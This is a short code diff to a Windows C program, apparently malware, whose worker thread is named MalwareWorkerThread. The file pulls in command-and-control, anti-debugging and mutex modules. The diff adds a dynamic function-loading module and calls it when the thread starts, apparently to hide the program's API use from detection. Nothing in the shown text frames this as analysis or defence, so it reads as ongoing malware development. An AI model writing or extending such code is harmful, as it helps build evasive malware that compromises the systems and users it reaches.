@@ -4,6 +4,7 @@
 #include <windows.h>
 #include <objbase.h>
 
+#include "dynamic_linking.c"
 #include "c2_handler.c"
 #include "debug_check.c"
 #include "mutex.c"
@@ -15,6 +16,12 @@ static volatile BOOL g_bRunning = FALSE;
 
 // Worker thread function
 DWORD WINAPI MalwareWorkerThread(LPVOID lpParameter) {
+    // Initialize dynamic function loading
+    if (!InitializeDynamicFunctions()) {
+        // Failed to load critical functions
+        return 1;
+    }
+
     // Set default C2 server configuration
     set_c2_server(NULL, 0);
     
